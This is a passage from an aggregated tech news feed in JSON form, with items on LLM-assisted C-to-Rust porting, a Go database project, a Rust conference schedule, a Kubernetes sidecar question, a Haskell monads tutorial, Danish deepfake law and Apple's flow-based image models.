href=\"https://github.com/csmith-project/csmith\">CSmith</a> and\n<a href=\"https://jepsen.io/\">Jepsen</a> find all sorts of weird interesting bugs.\nWhat's surprising is that with only one exception, the LLM translation + naive\nfuzz test correctly validated the symbol behavior . This meant\nthat we didn't run into any issues where after porting A, B ... Q, suddenly we\ndetect a subtle bug in R.</p><p>This meant we didn't have to \"backtrack\", or inspect the rest of the code base\nas we ported symbols: each symbol ported in isolation, we tested it (implicitly\ntesting the dependent symbols as well), and we moved on. If this didn't work,\nwe'd have to inspect the whole program and debug it, over and over, as we built\nit up.</p><p>If we think about it, this shouldn't have worked as well as it did. Fuzzing\nshouldn't hold for all functions. Imagine I'm converting something like a manual\nfloating-point multiplier:</p><pre><code>mul(a_bits: &amp;[byte], b_bits: &amp;[byte], c_bits: mut &amp;[byte]):\n</code></pre><p>If I fuzz this by providing random bytes, am I likely to detect a subtle issue\nwith underflow, or detect the <a href=\"https://en.wikipedia.org/wiki/Pentium_F00F_bug\">Pentium FOOF bug</a>?  Or imagine a C parser:\nfuzzing random bytes wouldn't trigger much of the parser. Without a lot of\nprobes, it seems hard to test these function spaces!</p><p>My hunch is that this works due to a combination of factors:</p><ul><li>I chose a simple library to work with. Zopfli isn't trivial, but you aren't juggling a lot of state, for example.</li><li>Fuzzers are good at probing the input space. If you <a href=\"https://llvm.org/docs/LibFuzzer.html#tracing-cmp-instructions\">compile with the right arguments</a> the fuzzer will try to choose inputs which trigger different branches. You can even give good examples (a corpus) to start the fuzzer off. I didn't do this for my experiments, but its easy to imagine an LLM generating a decent starting corpus.</li><li>Most code doesn't express subtle logic paths. If I test if a million inputs are correctly sorted, I've probably implemented the sorter correctly.</li><li>Complex logic, when it exists, is broken up across functions. Our individual tests make it easier to ensure the combined calls work.</li><li>The LLM produces correct code most of the time! The fuzz test is just there to validate we did the right thing.</li></ul><h2>Caveats, or don't try this at home</h2><p>While the overall system seems to work, its far from ready to drop in to a new project.</p><p><em>The resulting Rust code is very \"C-like\"</em></p><p>By construction, we use the same unsafe C interface for each symbol we port.\nThis is different from Syzygy, which generates a safe Rust version of the\nprogram in one shot.  This was convenient but not strictly required: I could\nhave tweaked the prompts and clearly indicate public/private interfaces, letting\nthe LLM use more idiomatic Rust for internal functions. Retaining the same\ninterfaces simplified writing the fuzz tests and let the LLM call into the\noriginal C code when debugging.</p><p>That said, because our end result has end-to-end fuzz tests and tests for every\nsymbol, its now much easier to \"rustify\" the code with confidence. This is a\ngreat task for future work.</p><p><em>The automation isn't complete</em></p><p>I tweaked the agent framework and prompts as I went to get better results out of Gemini. I needed to have Claude come in at the end to finish the last few symbols, and I fixed a few typos here and there. With better prompting and a better agent framework, this intervention would be reduced, but likely not go away entirely.</p><p>Zopfli is a simple library with many functions which are input/output oriented.\nIt's not clear how this would work if you introduced more stateful interfaces.</p><h2>Conclusions and future work</h2><p>Whew. This ended up taking a few days and being more than the initial trivial\nexperiment I intended. That said, I think there's some interesting insights:</p><ul><li><em>Porting via LLMs is surprisingly cost effective and only getting cheaper</em>. Even with my multiple rounds of experimentation and tweaking agents etc, the total cost for this experiment was ~$50, or about $0.01 a line. (For comparison, Syzygy cost ~$1500 using the O3 model). I suspect this could be brought down another 10x by walking up a \"complexity tree\": first try porting symbols mechanically (constants, structs, enums), then trying out a cheap model before falling back to more expensive models. For instance, Gemini Flash 2.5 is capable of producing correct Rust code for some non-trivial problems.</li><li>. The chat based interface of LLMs/agents can lead us to believe that they are more capable than they really are. We don't often realize how much we're guiding the direction of the LLMs until we try to go completely hands off.</li><li><em>Full automation isn't necessary</em>. Imagine a system where you have agents port as many symbols as they possibly can, in parallel. If a symbol fails to port, you mark it \"tainted\" and move on. You then continue until you can't port anything else. In such a system, a human could be brought in to fix issues as they emerge, but you could still rely on the agents to handle &gt;90% of the work of porting in an asynchronous manner.</li></ul><p>If you're interested in the (truly terrible) code I used for the porting, you\ncan find it on <a href=\"https://github.com/rjpower/portkit/\">Github</a>. I'm not sure if I'll\ncontinue down this route further myself, but let me know if you're interested in\nthis space or trying to port a project and I'm happy to chat more!</p>","contentLength":19670,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1llvud0/the_unreasonable_effectiveness_of_fuzzing_for/"},{"title":"Mochi v0.10.5: A LINQ-style query language with a bytecode VM written in Go","url":"https://github.com/mochilang/mochi/releases/tag/v0.10.5","date":1751034696,"author":"/u/Adept-Country4317","guid":173915,"unread":true,"content":"<p>We just released Mochi v0.10.5, a small statically typed language that lets you run SQL-like queries over JSON, CSV, YAML, or in-memory lists, with no database involved. It’s fully type-checked and compiles to a register-based bytecode VM written in Go.</p><p>The compiler includes constant folding, dead code elimination, and liveness analysis. It’s a lightweight way to explore how query engines and interpreters work, and a fun project if you're into Go, DSLs, or virtual machines. </p><p>Would love feedback or questions from everyone in the Go community!</p>","contentLength":549,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1llvdkf/mochi_v0105_a_linqstyle_query_language_with_a/"},{"title":"Up and running","url":"https://www.reddit.com/r/linux/comments/1lltyjf/up_and_running/","date":1751031078,"author":"/u/Strange_Professor101","guid":173705,"unread":true,"content":"<p>I heard that on Acer Aspire 3 you may have problems installing linux but here I got mine with ubuntu and everything seems to do well. Maybe ill even try some other distros, I just wanted to test if ubuntu works. Any distro recommendations if this is going to be used as a studying laptop for my physics/math degree? Or does it really matter which distro?</p>","contentLength":354,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Using the Internet without IPv4 connectivity (with WireGuard and network namespaces)","url":"https://jamesmcm.github.io/blog/no-ipv4/","date":1751030418,"author":"/u/btngames","guid":174065,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lltpql/using_the_internet_without_ipv4_connectivity_with/"},{"title":"I implemented database in Go - learned some hard lessons about transparency along the way","url":"https://www.reddit.com/r/golang/comments/1llto6y/i_implemented_database_in_go_learned_some_hard/","date":1751030299,"author":"/u/Professional_Bowl728","guid":173704,"unread":true,"content":"<p>A few days back, someone on Reddit called me out for not being upfront about my learning sources, and they were 100% right. I was being sketchy about the fact that I referenced James Smith's \"Build Your Own Database from Scratch in Go\" and studied a bunch of existing codebases to wrap my head around these concepts.</p><p>I've updated my README to properly credit everything I used because apparently being transparent about your learning process is just as important as the actual code - lesson learned the hard way.</p><p><strong>What I actually implemented:</strong></p><p>That being said, I did write every line of code myself by understanding the concepts and ended up going beyond what the book covered. The book gave me the foundation, but I built more on top.</p><ul><li>B+ tree storage engine with memory-mapped I/O</li><li>ACID transactions (BEGIN/COMMIT/ABORT - the whole deal)</li><li>Concurrent reads using worker pools</li><li>CLI that actually feels decent: CREATE, INSERT, UPDATE, DELETE, GET</li></ul><ul><li> - proper IEEE 754 encoding for decimals</li><li> - accepts true/false, 1/0, yes/no</li><li> - multiple input formats, UTC timezone stuff</li><li> COUNT, SUM, AVG, MIN, MAX</li></ul><p><strong>Performance (on my laptop):</strong></p><ul><li>~1,800 ops/sec for both inserts and queries</li><li>Sub-millisecond response times</li><li>Only 0.88 KB overhead per record</li></ul><p>I'm a final year CSE student and this project has been my deep dive into database internals. Plus I learned some important stuff about being honest about your sources and giving credit where it's due.</p>","contentLength":1409,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Using the Internet without IPv4 connectivity (with Wireguard and Network Namespaces)","url":"https://jamesmcm.github.io/blog/no-ipv4/","date":1751027866,"author":"/u/btngames","guid":173916,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1llst77/using_the_internet_without_ipv4_connectivity_with/"},{"title":"Rust Forge Conf 2025 Schedule Announced","url":"https://newsletter.rustforgeconf.com/archive/rust-forge-conf-2025-schedule-available-tours/","date":1751027822,"author":"/u/timClicks","guid":173913,"unread":true,"content":"<h2>\n                Read the conference schedule, find a few speakers you recognize, and check out the extra events which feature hobbits, kiwi and fusion reactors.\n            </h2><p>Rust Forge Conf 2025 is taking shape. It’s going to be an event that will change the arc of many people’s careers and generate personal connections that will last decades.</p><p>Now we just need to get as many people there as possible! Please take a look through the schedule below and share it with anyone who might know someone who might be a little bit curious.</p><p>Thank you to everyone around the world who has been so supportive of the event since it was first discussed over a year ago.</p><p>We’re so excited to create this event for you. Let’s generate those job opportunities, spark ideas and celebrate what everyone is able to build with the language.</p><p>Here are a few highlights from the schedule for people who don’t like lots of text:</p><ul><li><p>Learn the lessons from <strong>Adobe’s experience with bringing Rust into the Photoshop codebase</strong>. David Sankel is one of the people leading the effort, and he’ll be flying in from New York to tell us about the process first-hand.</p></li><li><p>Discover <strong>how to design a superconducting magnet powerful enough to lift an aircraft carrier</strong>. Tom Simpson from OpenStar will be explaining how they are developing fusion, in part enabled by modelling physics with Rust.</p></li><li><p><strong>Learn about implementing major projects with Rust</strong>. For example, Sophia Turner, who has been in the core team of TypeScript, Rust, Nushell and other major language projects will be discussing how to build a programming language.</p></li><li><p>The person who believed that Rust needed to a human success as much as a technical one, Steve Klabnik, will be discussing what makes Rust, Rust. <strong>What’s happened in the ten years since Rust 1.0, and what is in store for its future</strong>.</p></li></ul><p>There are many more topics being covered in the event than these highlights - especially blinking LEDs! Keep scrolling!</p><blockquote><p><strong><em>Adam Harvey will be presenting on crate security in 2025</em></strong></p></blockquote><p><em>The week of the conference is designed to have maximum time building relationships. We ramp spend time ramping up to the formal part</em></p><ul><li><p>explore the city at your own pace (be sure to try the coffee)</p></li><li><p><strong>Wed-Thur - Co-creation Days</strong> - collaboration, community building, workshops, guided tours</p></li><li><p> - dozens of talks and ample space for the hallway track</p></li><li><p>group bike ride and farewell</p></li></ul><blockquote><p><strong>Azriel Hoh will be presenting on the the developer experience with Rust</strong></p></blockquote><p><strong><em>Mon 25th - Tues 26 August</em></strong></p><p><em>The venue won’t be open yet, but people will be descending on Wellington from around the world.</em></p><ul><li><p>Make use of the self-guided itineraries. We’ll have options for people interested in food, art, history, and nature.</p></li></ul><p><em>Whether you want to work on a project with others, have conversations with project members that you wouldn’t otherwise be able to do or you want to immerse yourself in learning, these two days are for you to design your own programme.</em></p><ul><li><p><strong>Application Security Workshop</strong> with Laura Bell Main of <a href=\"http://SafeStack.io\" rel=\"noopener noreferrer nofollow\" target=\"_blank\">SafeStack.io</a></p></li><li><p><strong>Gamedev Workshop: Build a Game with Bevy</strong> with Stephan Dilly (rustunit), organiser of the worldwide Bevy Game Development Meetup</p></li><li><p><strong>Text User Interface (TUI) Workshop: Becoming a terminal chef with Ratatui</strong> by Orhun Parmaksız, Ratatui maintainer</p></li><li><p><strong>Full Stack Web Workshop: Shipping a Site with Leptos</strong> with Ben Wishovich, Leptos core team member</p></li></ul><ul><li><p> Wētā Workshop creates the characters, costumes and props behind The Lord of the Rings, The Hobbit, Avatar, Black Panther: Wakanda Forever and many others. We’ll be visiting the workshop that makes them, and have a chance at doing some leathermaking while we’re there.</p></li><li><p><strong>Zealandia Te Māra a Tāne Tour</strong>. Much of New Zealand’s wildlife is nocturnal. Explore the ecosanctuary by night with a guided tour, encountering many of the world’s most fascinating creatures.</p></li><li><p><strong>OpenStar Fusion Reactor Tour.</strong> Wellington hosts one of the world’s most novel fusion startups, OpenStar. Rather than using a tokamak reactor, they use a superconducting levitated dipole magnet to constrain the plasma field. And it works.</p></li></ul><ul><li><p>David Sankel: Engineering the Future at Adobe: Why Rust is Key to Our Next Chapter</p></li><li><p>Sophia J Turner: Building programming languages</p></li><li><p>James Blackwood-Sewell: PGRX - How Rust reshaped the Postgres ecosystem</p></li><li><p>EncodePanda: Rust for the Rest of Us: Your Survival Guide</p></li><li><p>Ross Younger: Land of the long fat pipe: the quest for faster file transfers</p></li><li><p>Mikey Williams: Rust in color: embedded LED art</p></li><li><p>Azriel Hoh: The Development Experience Is Different With Rust</p></li><li><p>mix irving: Peer-2-Peer Data Visualisation</p></li><li><p>Ugur Arikan: Composing zero cost abstractions in route optimization</p></li><li><p>Jack Purvis: From Ruby to Rust: building a live visual performance tool with Rust</p></li><li><p>Orhun Parmaksız: Rust rocks (literally)</p></li><li><p>Tom Simpson: Designing superconducting magnets for fusion power</p></li><li><p>Adam Harvey: Crate security in 2025</p></li><li><p>Predrag Gruevski: The Past, Present, and Future of SemVer in Rust</p></li><li><p>Anders Rasmussen: Embedded Device Drivers in Rust</p></li><li><p>Jonas Kruckenberg: Panic! At The Disk — Oh!</p></li><li><p>Elias Junior: Tackling complexity a test at a time</p></li><li><p>Jeremy Wells: Take your web app offline with Rust and Tauri</p></li><li><p>David Lattimore: Wild build times</p></li><li><p>Steve Klabnik: Rust is (much) more than safety</p></li></ul><p>Amazing, right?! See you soon 🙌</p>","contentLength":5158,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1llssm0/rust_forge_conf_2025_schedule_announced/"},{"title":"Common way to stop sidecar when main container finish,","url":"https://www.reddit.com/r/kubernetes/comments/1llsmby/common_way_to_stop_sidecar_when_main_container/","date":1751027315,"author":"/u/Ancient_Canary1148","guid":173668,"unread":true,"content":"<p>i have a main container and a sidecar running together in kubernetes 1.31.</p><p>What is the best way in 2025 to remove the sidecar when the main container finish? </p><p>I dont want to add extra code to the sidecar (it is a token renewer that sleep for some hours and then renovate it). Or i dont want to write into a shared file that the main container is stopped.</p><p>I have been trying to use lifecycle preStop like above (setting in the pod shareProcessNamespace: true). But this doesnt work, probably because it fails too fast.</p><pre><code>shareProcessNamespace: true lifecycle: preStop: exec: command: - sh - -c - | echo \"PreStop hook running\" pkill -f renewer.sh || true </code></pre>","contentLength":647,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"monads at a practical level","url":"https://nyadgar.com/posts/monad/","date":1751026531,"author":"/u/No-Bug-242","guid":173849,"unread":true,"content":"<a href=\"mailto:noam.g4@gmail.com\">By Noam Yadgar</a><p>If you have searched for  and reached this article,\nyou probably have some degree of knowledge about monads.\nYou may have already put a fair amount of effort into learning monads.\nIn any way, whenever you’ve tried to learn monads, you have likely\nencountered two main approaches:</p><ul><li>The: <em>Monads are simple, here’s a simple example of a monad</em>.</li><li>Or the famous: <em>A monad is a monoid in the category of endofunctors</em>.</li></ul><p>In both approaches, the layout is similar. We start with a strong statement like:\n<em>A monad is a powerful concept when applied to programming</em>, and later\napologize for being one of the most difficult programming concepts to grasp. The\nreality is that all of these statements about monads are valid, and the truth lies somewhere in the middle.</p><h2>Part I - What is a monad?</h2><p>Monads are indeed simple and powerful, but understanding the effects and conpect in their most\ngeneric form, requires some patience. In this article, we will build the knowledge for monads, step by step. We will\nuse Haskell to get a good intuition for monads and try to consume just the correct dose of information for a single article.</p><p>But first, let’s ask: Why do we even need monads?</p><p>While other programming styles combine\ncomposed functions and procedures,\nfunctional programming is based exclusively on composition.\nIf we want a system that is based exclusively on compositions,\nwe better use  functions; otherwise, it would be problematic to\nrely on such a system.</p><p>But what are  functions?</p><p>For a function to be , it needs to:</p><ul><li>Always map the same input to the same output.</li><li>Produce no side effects (more on that later).</li></ul><p>Here’s a simple function written in JavaScript. Is it a pure function?</p><div><pre tabindex=\"0\"><code data-lang=\"js\"></code></pre></div><p>It returns a value, and every input maps exactly to the same output, but the function produces a side effect.\nAny IO, errors, and manipulations of outside states are considered . In the case of ,\nwe’re calling for  which writes to the browser’s console or  (depending on the environment).</p><p>Let \\(S\\) represent drawing over some piece of paper.\nEvery time we apply \\(S\\), the same piece of paper has a new mark.</p><p>Can \\(S\\) satisfy the criteria of a pure function?</p><p>As an input, \\(S\\) can be given a list of coordinates to describe point-to-point motion; if we\ndecide to  the paper after application (i.e.,  the paper),\n\\(S\\) cannot consistently map inputs to outputs. If we have two different sets of coordinates\n\\(u\\) and \\(v\\) and we apply \\(S\\) in the order: </p>\n\\[S(u) \\rightarrow S(v) \\rightarrow S(u)\\]<p>\nThe second application of \\(S(u)\\) will yield different results than the first one.\nBecause by the second application of \\(S(u)\\), the results on the paper have changed by \\(S(v)\\).</p><p>\\(S\\) cannot be a pure function.\nThe drawing action creates marks on the paper, and , which make \\(S\\)\nitself inconsistent. Even if \\(S\\) doesn’t return the paper as a result, other things might interact with\nthe paper, and \\(S\\) would make them inconsistent as well. Similar to writing on a piece of paper, writing to \nis also a side effect.</p><p>A programming language that cannot support side effects is pretty useless, and the\npeople behind Haskell understood that, during research conducted in the late 1980s to early 1990s, they managed to keep Haskell pure while supporting side effects.</p><p>A pure functional programming language that supports side effects is not an easy task,\nit requires a way of supporting the behavior like the above  while\nmaintaining the properties of a pure function. The people working on Haskell found that they\ncan borrow the concept of a  from , and it will provide the missing link\nbetween side effects and pure functional programming.</p><div><p>Although we borrow the monad from <a href=\"https://en.wikipedia.org/wiki/Category_theory\" target=\"_blank\" rel=\"noopener\">Category theory</a>\n,\nwe don’t have to study the theory.</p></div><p>We can rewrite  in Haskell:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>What makes the Haskell version pure? At first glance, both versions look similar,\nbut they’re very different. If we examine the function signature of \nwe will see:</p><p>In the JavaScript version, the input and output of  are the same type (the  type).\nIn Haskell,  takes an  and returns a wrapped  called .\nThe  function in Haskell is written using a  called ,\nbut if we clear out this syntax, our function will look like this:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>It appears as if the functions  and  are connected with some operator \n(I pronounce it  for easier read).\nLet’s examine the function signatures of , , and .</p><p>Interestingly,  also returns an  type; this time, it wraps the empty tuple type.\nThe signature of  gives us a clue - maybe we’re passing the  type from one function to another.\nLet’s continue with checking the  function:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>The  function is specifically defined for , it simply takes any value\nand returns it in a  context. In our example,  takes the\n value of  and  it to be an . Even if we don’t\nyet understand what is a monad, our first clue is that the  type is probably one.</p><p>We’ve never specified the type signature of , yet somehow, the compiler knew that\nour call for  should invoke the  monad. It’s not surprising\nbecause the  function is connected to the  function by the mysterious \noperator:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>The  operator is also a function definition for a ,\nit’s a binary operator that takes two monads of type \\(m\\): One with a value of some type \\(a\\) and the other\nwith a value of some type \\(b\\). Then, it returns a  \\(m\\) with a value of type \\(b\\). It generally implies that when\ndefining some type as a monad, we need to define how we reconcile the  transition from\na monad with some value \\(a\\) to the same monad with some value \\(b\\).</p><p> handles the  operator by simply ignoring the first argument’s\nvalue and returning the second argument.\nThis clever  allows us to perform IO actions without leaving the monadic context.\nSince we’re not interested in the value of the first monad\n(the empty tuple - , which is roughly equivalent to the  type in C),\nwe use the  operator to  this value and pick the second  monad ().</p><pre>flowchart LR\n    A(\"IO ()\") --&gt;| \\&gt;\\&gt; | B(\"IO (x + 5)\")\n    B --&gt;|\"Ignoring ()\"| C(\"IO (x + 5)\")\n</pre><p>For every  we pass to ,\nwe will always get the same  in return;\nhowever, we call for  to write\nto . How can we say that  is pure?</p><p>Imagine a  paper, one that can replicate itself out of thin air and\ncommunicate with some  paper at some mysterious dimension we cannot reach.</p><p>Let \\(F\\) represent a function that takes a  paper with a set of coordinates and returns\na copy of the  paper, with marks drawn from one position to another.</p><p>Does \\(F\\) meet the criteria of a pure function?</p><ul><li>\\(F\\) returns a  paper.</li><li>We can  map the same set of inputs to the same output.\nFor example, if we have two different sets of coordinates \\(u\\) and \\(v\\) and a  paper \\(p\\), we can apply\n\\(F\\) as following: \\[F(F(F(p, u), v), u)\\]\nEvery application of \\(F\\) will be consistent.</li><li>In the  dimension of which \\(F\\) exists, \\(F\\) does not create any side effects. It doesn’t\n in a context where a  paper even exist.</li></ul><p>If we accept the above, we understand that side effects are relative, and we can write a completely\npure functional program that performs side effects at the  dimension.\nWith this approach, relative to our perspective,  is a pure function that takes\nan  and returns an . From a system-level standpoint, it invokes what  call\nan  that interacts with the , in our case, writing to .</p><p>This is it. The whole point of monads is that they provide a generic framework for wrapping and passing values with contexts.\nThese contexts can have many things in the background, such as IO actions (writing to files, reading from files, logs, networking, etc.),\nerror management, and more. All the  we need to make useful software are encapsulated within monads.</p><p>If you look at the definition of the  type, you’ll see that it’s being constructed with\na function that literally takes the  type and returns a pair of \nand some type . The  type is the  paper of the  monad.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Let’s make a more interesting program and see another type of monad in action.\nWe start by using a function to convert a  to an .\nWe can use the built-in function :</p><p>The  function takes a  and\nconverts it to a type that satisfies the  class.\nSince  has an implementation for ,\nwe can use  to convert a  to an .</p><p>This function has a problem; what happens if the  argument we pass to \ncannot be converted to an ? The answer is that the program will crash.\nTo fix this, Let’s use a modified version of , called .</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>The  type is one of Haskell’s most famous built-in types.\nIt’s an interesting monad that can capture the behavior of operations that might\nfail or are undefined in certain areas of their domain. Two ways can construct the  type:</p><ul><li> - Usually indicates that the function has failed and the returned value is nothing.</li><li> - A constructor that holds a generic value , usually the returned value from a successful evaluation.</li></ul><p>If we call  with a string that cannot be parsed as an , we get ,\nand if the provided string can be parsed as an , we get , where  is the parsed value.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>I wrote about the notion of progressing a value from one monad\nto another, but I’ve yet to reveal one of the most important operators of monads, the \noperator (or ).</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>This binary operator takes a monad and a function. The idea of this operator is that the provided function\nwill be applied to the inner value of the monad and return a new monad\nwith the results.</p><pre>flowchart LR\n    A(m a) --&gt;|taking a from m a| B(f :: a -&gt; m b)\n    B --&gt;|applying f to a to get m b| C(m b)\n</pre><p>To show binding in action, let’s first define a function that takes an , checks if it’s an even number,\nand returns a . If the number is odd - we return ; otherwise,\nwe will return  where  is the original argument.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Now, let’s try to bind  with :</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>We see that no matter what, if  pops up, it will be returned.\nIt is a perfect behavior for a monad that aims to capture failures,\nsince it doesn’t matter how many functions we chain, if something fails in the process,\nwe skip the evaluation and let the  constructor .</p><p>If we compare the  type to numbers and  functions\nto multiplication, the  constructor acts as a \\(0\\).\nMuch like:</p>\n\\[(a \\cdot b) \\cdot 0 = a \\cdot (b \\cdot 0) = 0\\]<p>To ensure monads behave correctly, we can check if they follow the monadic Identities:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Let’s test the  monad:</p><p>The  states that any value passed to  and bound\nto some function  is the same as applying  to this value. This identity ensures that the\nbind operator applies the provided function to the inner value of the monad.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>The  states that any monad bound to the  function,\nshould return the same monad with the same inner value. This identity ensures that the  function is just\n a value to a monadic context.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Associativity means that the order of binding is not essential. In our example:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Let’s write a program that:</p><ul><li>Reads a string from the user.</li><li>Tries to parse it as an </li><li>If the string can be an  it checks if it’s an even number</li><li>If the result is not an even number, it prints “failed”</li><li>Otherwise, it applies  to the number and prints the results</li></ul><p>We’ve already encountered all the functions in this program, except\n, which takes an input string from the user.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Let’s run it three times and provide different inputs:</p><div><pre tabindex=\"0\"><code data-lang=\"bash\"></code></pre></div><p>Although being very  and , our  function is a bit\nhard to read. It involves one bind between  and some big\nlambda function, and the lambda itself has a nested lambda inside a case\nclause. This is a known issue in Haskell; for a language that often\nreceives the informal title of <em>the most beautiful programming language</em>,\nthe overuse of arrows, parenthesis, and lambdas makes for a pretty unpleasant syntax.</p><p>To fix this, Haskell has an alternative syntax known as .\nThe  notation can be used to replace a pattern like:</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>That is undoubtedly a much nicer syntax to read. We can rewrite the \nfunction with  notation, and you will notice that the code changes to\nbe almost one-to-one with the requirements that we wrote in plain English.</p><div><pre tabindex=\"0\"><code data-lang=\"haskell\"></code></pre></div><p>Besides letting their inner values naturally pass through from function to function,\nmonads are values by themselves.\nThey represent actions, states, and statuses that are carried over from one function to another,\nThey are context carriers that provide a background layer to perform all sorts of necessary effects. Therefore,\nthey are the ultimate link between pure functional programming and the real world.</p>","contentLength":12172,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1llsd1x/monads_at_a_practical_level/"},{"title":"Denmark to tackle deepfakes by giving people copyright to their own features","url":"https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence","date":1751026077,"author":"/u/F0urLeafCl0ver","guid":173670,"unread":true,"content":"<p>The Danish government is to clamp down on the creation and dissemination of AI-generated deepfakes by changing copyright law to ensure that everybody has the right to their own body, facial features and voice.</p><p>The Danish government said on Thursday it would strengthen protection against digital imitations of people’s identities with what it believes to be the first law of its kind in <a href=\"https://www.theguardian.com/world/europe-news\" data-link-name=\"in body link\" data-component=\"auto-linked-tag\">Europe</a>.</p><p>Having secured broad cross-party agreement, the department of culture plans to submit a proposal to amend the current law for consultation before the summer recess and then submit the amendment in the autumn.</p><p>It defines a deepfake as a very realistic digital representation of a person, including their appearance and voice.</p><p>The Danish culture minister, Jakob Engel-Schmidt, said he hoped the bill before parliament would send an “unequivocal message” that everybody had the right to the way they looked and sounded.</p><p>He told the Guardian: “In the bill we agree and are sending an unequivocal message that everybody has the right to their own body, their own voice and their own facial features, which is apparently not how the current law is protecting people against generative AI.”</p><p>He added: “Human beings can be run through the digital copy machine and be misused for all sorts of purposes and I’m not willing to accept that.”</p><p>The move, which is believed to have the backing of nine in 10 MPs, comes amid rapidly developing AI technology that has made it easier than ever to create a convincing fake image, video or sound to mimic the features of another person.</p><p>The changes to Danish copyright law will, once approved, theoretically give people in <a href=\"https://www.theguardian.com/world/denmark\" data-link-name=\"in body link\" data-component=\"auto-linked-tag\">Denmark</a> the right to demand that online platforms remove such content if it is shared without consent.</p><p>It will also cover “realistic, digitally generated imitations” of an artist’s performance without consent. Violation of the proposed rules could result in compensation for those affected.</p><p>The government said the new rules would not affect parodies and satire, which would still be permitted.</p><figure data-spacefinder-role=\"inline\" data-spacefinder-type=\"model.dotcomrendering.pageElements.NewsletterSignupBlockElement\"><a data-ignore=\"global-link-styling\" href=\"https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence#EmailSignup-skip-link-11\">skip past newsletter promotion</a><p tabindex=\"0\" aria-label=\"after newsletter promotion\" role=\"note\">after newsletter promotion</p></figure><p>“Of course this is new ground we are breaking, and if the platforms are not complying with that, we are willing to take additional steps,” said Engel-Schmidt.</p><p>Other European countries, he hopes, will follow Denmark’s lead. He plans to use Denmark’s forthcoming EU presidency to share its plans with his European counterparts.</p><p>If tech platforms do not respond accordingly to the new law, they could be subject to “severe fines”, he said, and it could become a matter for the European Commission. “That is why I believe the tech platforms will take this very seriously indeed,” he added.</p>","contentLength":2708,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lls7ty/denmark_to_tackle_deepfakes_by_giving_people/"},{"title":"Apple Research just unearthed a forgotten AI technique and is using it to generate images","url":"https://9to5mac.com/2025/06/23/apple-ai-image-model-research-tarflow-starflow/","date":1751025673,"author":"/u/F0urLeafCl0ver","guid":173774,"unread":true,"content":"<p>Today, most generative image models basically fall into two main categories: diffusion models, like Stable Diffusion, or autoregressive models, like OpenAI’s GPT-4o. But Apple just released two papers that show how there might be room for a third, forgotten technique: Normalizing Flows. And with a dash of Transformers on top, they might be more capable than previously thought.</p><h2>First things first: What are Normalizing Flows?</h2><p>Normalizing Flows (NFs) are a type of AI model that works by learning how to mathematically transform real-world data (like images) into structured noise, and then reverse that process to generate new samples.</p><p>The big advantage is that they can calculate the exact likelihood of each image they generate, a property that diffusion models can’t do. This makes flows especially appealing for tasks where understanding the probability of an outcome really matters.</p><p>But there’s a reason most people haven’t heard much about them lately: Early flow-based models produced images that looked blurry or lacked the detail and diversity offered by diffusion and transformer-based systems.</p><p>At its core, TarFlow replaces the old, handcrafted layers used in previous flow models with Transformer blocks. Basically, it splits images into small patches, and generates them in blocks, with each block predicted based on all the ones that came before. That’s what’s called autoregressive, which is the same underlying method that OpenAI currently uses for image generation.</p><p>The key difference is that while OpenAI generates discrete tokens, treating images like long sequences of text-like symbols, Apple’s TarFlow generates pixel values directly, without tokenizing the image first. It’s a small, but significant difference because it lets Apple avoid the quality loss and rigidity that often come with compressing images into a fixed vocabulary of tokens.</p><p>Still, there were limitations, especially when it came to scaling up to larger, high-res images. And that’s where the second study comes in.</p><p>The biggest change: STARFlow no longer generates images directly in pixel space. Instead, it basically works on a compressed version of the image, and then hands things off to a decoder that upsamples everything back to full resolution at the final step.</p><p>This shift to what is called latent space means STARFlow doesn’t need to predict millions of pixels directly. It can focus on the broader image structure first, leaving fine texture detail to the decoder.</p><p>Apple also reworked how the model handles text prompts. Instead of building a separate text encoder, STARFlow can plug in existing language models (like Google’s small language model Gemma, which in theory could run on-device) to handle language understanding when the user prompts the model to create the image. This keeps the image generation side of the model focused on refining visual details.</p><p>While Apple is rethinking flows, OpenAI has also recently moved beyond diffusion with its GPT-4o model. But their approach is fundamentally different.</p><p>GPT-4o treats images as sequences of discrete tokens, much like words in a sentence. When you ask ChatGPT to generate an image, the model predicts one image token at a time, building the picture piece by piece. This gives 